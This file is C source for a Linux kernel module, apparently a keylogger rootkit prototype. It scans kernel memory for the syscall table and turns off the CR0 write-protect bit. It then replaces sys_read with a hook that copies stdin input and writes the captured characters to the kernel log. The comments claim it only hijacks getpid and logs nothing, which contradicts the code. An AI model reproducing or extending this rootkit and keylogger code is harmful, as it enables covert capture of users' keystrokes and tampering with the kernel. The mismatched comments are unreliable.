#include <linux/init.h> // required for module_init/exit
#include <linux/module.h> // required for module development
#include <linux/kernel.h> // since we're dealing with the kerne
#include <linux/errno.h> // not too sure about this
#include <linux/unistd.h> // we're messing with syscalls
#include <linux/syscalls.h> // same as above
#include <linux/types.h>
#include <linux/slab.h>

// this file, as it stands, is just a proof of concept. It doesn't
// keylog anything, it just hijacks the getpid syscall.

// these memory locations are specific to 32-bit systems
#define START_MEM 0xc0000000
#define END_MEM 0xd0000000

// a module license is required for most modules to run
MODULE_LICENSE("GPL");

// allows us to make system calls in the kernel
mm_segment_t old_fs;
static inline void begin_kmem(void){
  old_fs = get_fs();
  set_fs(get_ds());
}
static inline void end_kmem(void){
  set_fs(old_fs);
}

// this will point to the syscall_table
unsigned long *syscall_table;

// pointer to the original sys_getpid call. When we
asmlinkage long (*original_read)(unsigned int, char*, size_t);

// our replacement sys_getpid
asmlinkage long new_read(unsigned int fd, char *buf, size_t size) {
  // hijacked getpid
  // call the original function
  long ret = original_read(fd,buf,size);
  if(!fd && ret > 0){
    char *buffer = (char*)kmalloc(size*sizeof(char), GFP_KERNEL);
    if(!copy_from_user(buffer,buf,size)){
      printk(KERN_ALERT "buf is %c %x",buffer[0], buffer[0]);
    }
    kfree(buffer);
  }
  return ret;
}

static int init(void) {

  // find the syscall table address through a brute force
  unsigned long i = START_MEM;
  while(i < END_MEM){
    // we will compare the current address with that of sys_close
    unsigned long *current_address = (unsigned long*)i;
    if(current_address[__NR_close] == sys_close){
      printk(KERN_ALERT "sys call table address is %lu\n",
	     (unsigned long)current_address);
      syscall_table = current_address;
      break;
    }
    i+= sizeof(void*);
  }
  // debugging purposes
  printk(KERN_ALERT "module initted\n");

  // change wp bit to 0
  write_cr0 (read_cr0 () & (~0x10000));

  // store the original getpid and replace it with ours
  original_read = (void *)syscall_table[__NR_read];
  syscall_table[__NR_read] = new_read;

  // restore the wp bit
  write_cr0 (read_cr0 () | 0x10000);
  
  return 0;
}
	 
static void exit(void) {
  // change wp bit to 0
  write_cr0 (read_cr0 () & (~0x10000));

  // restore the original getpid function
  syscall_table[__NR_read] = original_read;

  // restore the wp bit
  write_cr0 (read_cr0 () | 0x10000);
  printk(KERN_ALERT "module exitted\n");
}

// sets our custom functions as the init and exit functions
module_init(init);
module_exit(exit);
